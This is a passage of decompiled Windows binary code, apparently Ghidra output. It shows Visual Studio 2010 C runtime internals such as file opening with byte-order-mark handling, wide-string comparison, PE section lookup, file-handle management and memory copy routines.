    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_0040df7f;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_0040df7f:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_20 = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_10 & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_1c == 0) goto LAB_0040e142;
        if (2 < local_1c) {
          if (local_1c < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_0040dfe7;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_0040e0ac;
          }
LAB_0040dfde:
          if (local_1c != 5) goto LAB_0040e142;
        }
LAB_0040dfe7:
        iVar12 = 0;
        if (local_6 == 1) {
          local_20 = 0xbfbbef;
          iVar15 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_0040e142;
          local_20 = 0xfeff;
          iVar15 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_20 + iVar12),iVar15 - iVar12);
          if (iVar9 == -1) goto LAB_0040dec0;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < iVar15);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_1c != 0)) {
            if (2 < local_1c) {
              if (4 < local_1c) goto LAB_0040dfde;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_0040dec0;
                goto LAB_0040e032;
              }
            }
            goto LAB_0040dfe7;
          }
          goto LAB_0040e142;
        }
LAB_0040e032:
        iVar12 = __read_nolock(*in_EAX,&local_20,3);
        if (iVar12 == -1) goto LAB_0040dec0;
        if (iVar12 == 2) {
LAB_0040e0b9:
          if ((local_20 & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_20 & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_0040dec0;
            local_6 = 2;
            goto LAB_0040e142;
          }
        }
        else if (iVar12 == 3) {
          if (local_20 == 0xbfbbef) {
            local_6 = 1;
            goto LAB_0040e142;
          }
          goto LAB_0040e0b9;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_0040e0ac:
        if (uVar4 == 0xffffffff) goto LAB_0040dec0;
      }
    }
  }
LAB_0040e142:
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if ((local_10 & 0xc0000000) != 0xc0000000) {
    return local_c;
  }
  if ((param_3 & 1) == 0) {
    return local_c;
  }
  CloseHandle(local_24);
  pvVar10 = CreateFileW(param_2,local_10 & 0x7fffffff,local_18,&local_38,3,local_14,(HANDLE)0x0);
  if (pvVar10 != (HANDLE)0xffffffff) {
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)*in_EAX >> 5]) = pvVar10;
    return local_c;
  }
  DVar7 = GetLastError();
  __dosmaperr(DVar7);
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0xfe;
  __free_osfhnd(*in_EAX);
LAB_0040ddcc:
  piVar6 = __errno();
  return *piVar6;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00414f08;
  uStack_c = 0x40e260;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_004071df();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = FUN_0040db1f(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040e2ea();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_0040e2ea(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_EDI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_EDI) {
      pbVar1 = (byte *)((&DAT_00418ea0)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wint_t wVar1;
  wint_t wVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  uint uVar6;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar3 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar4 = __errno();
      *piVar4 = 0x16;
      FUN_004071df();
      iVar3 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar3 = (int)_Str1 - (int)_Str2;
        do {
          uVar5 = (uint)*(ushort *)(iVar3 + (int)_Str2);
          if ((0x40 < uVar5) && (uVar5 < 0x5b)) {
            uVar5 = uVar5 + 0x20 & 0xffff;
          }
          uVar6 = (uint)(ushort)*_Str2;
          if ((0x40 < uVar6) && (uVar6 < 0x5b)) {
            uVar6 = uVar6 + 0x20 & 0xffff;
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && ((short)uVar5 != 0)) && ((short)uVar5 == (short)uVar6));
      }
      else {
        do {
          wVar1 = __towlower_l(*_Str1,&local_14);
          uVar5 = (uint)wVar1;
          wVar2 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar6 = (uint)wVar2;
          if ((_MaxCount == 0) || (wVar1 == 0)) break;
        } while (wVar1 == wVar2);
      }
      iVar3 = uVar5 - uVar6;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  ushort uVar4;
  
  if (DAT_00417b2c == 0) {
    iVar1 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar2 = __errno();
        *piVar2 = 0x16;
        FUN_004071df();
        iVar1 = 0x7fffffff;
      }
      else {
        iVar1 = (int)_Str1 - (int)_Str2;
        do {
          uVar4 = *(ushort *)(iVar1 + (int)_Str2);
          if ((0x40 < uVar4) && (uVar4 < 0x5b)) {
            uVar4 = uVar4 + 0x20;
          }
          uVar3 = (uint)(ushort)*_Str2;
          if ((0x40 < uVar3) && (uVar3 < 0x5b)) {
            uVar3 = uVar3 + 0x20 & 0xffff;
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (uVar4 != 0)) && (uVar4 == (ushort)uVar3));
        iVar1 = uVar4 - uVar3;
      }
    }
  }
  else {
    iVar1 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar1;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2010 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_00416048 ^ 0x414f28;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40e668,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0040e670;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_0040e784();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00416e88 = param_1;
  DAT_00416e84 = in_EAX;
  DAT_00416e8c = unaff_EBP;
  return;
}



void FUN_0040e784(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00418e90)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_00418ea0)[param_1 >> 5]) == -1) {
      if (DAT_00416000 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040e7e4;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_0040e7e4:
      *(intptr_t *)(iVar3 + (&DAT_00418ea0)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00418e90)) {
    iVar1 = (&DAT_00418ea0)[param_1 >> 5];
    iVar4 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar1 + 4 + iVar4) & 1) != 0) && (*(int *)(iVar1 + iVar4) != -1)) {
      if (DAT_00416000 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040e86a;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040e86a:
      *(undefined4 *)(iVar4 + (&DAT_00418ea0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2010 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar3 + 4 + (&DAT_00418ea0)[_FileHandle >> 5]) & 1) != 0) {
        return *(intptr_t *)(iVar3 + (&DAT_00418ea0)[_FileHandle >> 5]);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004071df();
  }
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2010 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_00418ea0)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0040e98d();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_00418ea0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_0040e98d(void)

{
  FUN_0040da13(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_00418ea0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_00418ea0)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_00418ea0)[iVar5] = puVar4;
          DAT_00418e90 = DAT_00418e90 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_00418ea0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_00418ea0)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_00418ea0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_0040ea8f();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_00418ea0)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_0040eb4d();
  }
  return local_20;
}



void FUN_0040ea8f(void)

{
  FUN_0040da13(10);
  return;
}



void FUN_0040eb4d(void)

{
  FUN_0040da13(0xb);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

undefined (*) [16] __fastcall __VEC_memzero(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  
  pauVar2 = param_1;
  if (((uint)param_1 & 0xf) != 0) {
    uVar3 = 0x10 - ((uint)param_1 & 0xf);
    param_2 = param_2 - uVar3;
    for (uVar1 = uVar3 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
      (*pauVar2)[0] = 0;
      pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
    }
    for (uVar3 = uVar3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined4 *)*pauVar2 = 0;
      pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
    }
  }
  for (uVar1 = param_2 >> 7; uVar1 != 0; uVar1 = uVar1 - 1) {
    *pauVar2 = (undefined  [16])0x0;
    pauVar2[1] = (undefined  [16])0x0;
    pauVar2[2] = (undefined  [16])0x0;
    pauVar2[3] = (undefined  [16])0x0;
    pauVar2[4] = (undefined  [16])0x0;
    pauVar2[5] = (undefined  [16])0x0;
    pauVar2[6] = (undefined  [16])0x0;
    pauVar2[7] = (undefined  [16])0x0;
    pauVar2 = pauVar2 + 8;
  }
  if ((param_2 & 0x7f) != 0) {
    for (uVar1 = (param_2 & 0x7f) >> 4; uVar1 != 0; uVar1 = uVar1 - 1) {
      *pauVar2 = (undefined  [16])0x0;
      pauVar2 = pauVar2 + 1;
    }
    if ((param_2 & 0xf) != 0) {
      for (uVar1 = (param_2 & 0xf) >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {
        *(undefined4 *)*pauVar2 = 0;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
      }
      for (uVar1 = param_2 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
        (*pauVar2)[0] = 0;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
      }
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2010 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_00418ea0)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_00418ea0)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_0040ecd9;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_0040ecd9:
        FUN_0040ecf1();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004071df();
  }
  return -1;
}



void FUN_0040ecf1(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_00416f00 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_00416f00 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_00416f00,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return _WCh;
    }
  }
  return 0xffff;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2010 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

undefined4 * __fastcall __VEC_memcpy(uint param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  uint uVar17;
  undefined4 *unaff_ESI;
  undefined4 *unaff_EDI;
  undefined4 *puVar18;
  
  puVar18 = unaff_EDI;
  if (((uint)unaff_ESI & 0xf) != 0) {
    uVar17 = 0x10 - ((uint)unaff_ESI & 0xf);
    param_1 = param_1 - uVar17;
    for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
      *(undefined *)puVar18 = *(undefined *)unaff_ESI;
      unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
      puVar18 = (undefined4 *)((int)puVar18 + 1);
    }
    for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {
      *puVar18 = *unaff_ESI;
      unaff_ESI = unaff_ESI + 1;
      puVar18 = puVar18 + 1;
    }
  }
  for (uVar16 = param_1 >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {
    uVar1 = unaff_ESI[1];
    uVar2 = unaff_ESI[2];
    uVar3 = unaff_ESI[3];
    uVar4 = unaff_ESI[4];
    uVar5 = unaff_ESI[5];
    uVar6 = unaff_ESI[6];
    uVar7 = unaff_ESI[7];
    uVar8 = unaff_ESI[8];
    uVar9 = unaff_ESI[9];
    uVar10 = unaff_ESI[10];
    uVar11 = unaff_ESI[0xb];
    uVar12 = unaff_ESI[0xc];
    uVar13 = unaff_ESI[0xd];
    uVar14 = unaff_ESI[0xe];
    uVar15 = unaff_ESI[0xf];
    *puVar18 = *unaff_ESI;
    puVar18[1] = uVar1;
    puVar18[2] = uVar2;
    puVar18[3] = uVar3;
    puVar18[4] = uVar4;
    puVar18[5] = uVar5;
    puVar18[6] = uVar6;
    puVar18[7] = uVar7;
    puVar18[8] = uVar8;
    puVar18[9] = uVar9;
    puVar18[10] = uVar10;
    puVar18[0xb] = uVar11;
    puVar18[0xc] = uVar12;
    puVar18[0xd] = uVar13;
    puVar18[0xe] = uVar14;
    puVar18[0xf] = uVar15;
    uVar1 = unaff_ESI[0x11];
    uVar2 = unaff_ESI[0x12];
    uVar3 = unaff_ESI[0x13];
    uVar4 = unaff_ESI[0x14];
    uVar5 = unaff_ESI[0x15];
    uVar6 = unaff_ESI[0x16];
    uVar7 = unaff_ESI[0x17];
    uVar8 = unaff_ESI[0x18];
    uVar9 = unaff_ESI[0x19];
    uVar10 = unaff_ESI[0x1a];
    uVar11 = unaff_ESI[0x1b];
    uVar12 = unaff_ESI[0x1c];
    uVar13 = unaff_ESI[0x1d];
    uVar14 = unaff_ESI[0x1e];
    uVar15 = unaff_ESI[0x1f];
    puVar18[0x10] = unaff_ESI[0x10];
    puVar18[0x11] = uVar1;
    puVar18[0x12] = uVar2;
    puVar18[0x13] = uVar3;
    puVar18[0x14] = uVar4;
    puVar18[0x15] = uVar5;
    puVar18[0x16] = uVar6;
    puVar18[0x17] = uVar7;
    puVar18[0x18] = uVar8;
    puVar18[0x19] = uVar9;
    puVar18[0x1a] = uVar10;
    puVar18[0x1b] = uVar11;
    puVar18[0x1c] = uVar12;
    puVar18[0x1d] = uVar13;
    puVar18[0x1e] = uVar14;
    puVar18[0x1f] = uVar15;
    unaff_ESI = unaff_ESI + 0x20;
    puVar18 = puVar18 + 0x20;
  }
  if ((param_1 & 0x7f) != 0) {
    for (uVar16 = (param_1 & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
      uVar1 = unaff_ESI[1];
